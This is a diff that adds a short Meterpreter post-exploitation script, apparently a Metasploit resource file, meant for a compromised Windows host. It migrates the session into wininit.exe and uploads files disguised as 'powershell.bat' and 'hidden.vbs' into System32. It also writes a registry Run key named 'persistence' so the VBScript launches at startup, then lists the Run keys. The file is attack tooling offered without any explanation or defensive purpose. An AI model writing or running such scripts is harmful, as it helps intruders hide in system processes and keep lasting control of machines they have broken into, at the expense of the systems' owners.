@@ -1,0 +1,6 @@
+sysinfo
+run migrate -n wininit.exe
+upload /var/www/powershell.bat C:\\Windows\\System32\\powershell.bat
+upload /var/www/hidden.vbs C:\\Windows\\System32\\hidden.vbs
+reg setval -k HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -v persistence -d 'C:\windows\system32\hidden.vbs'
+reg enumkey -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
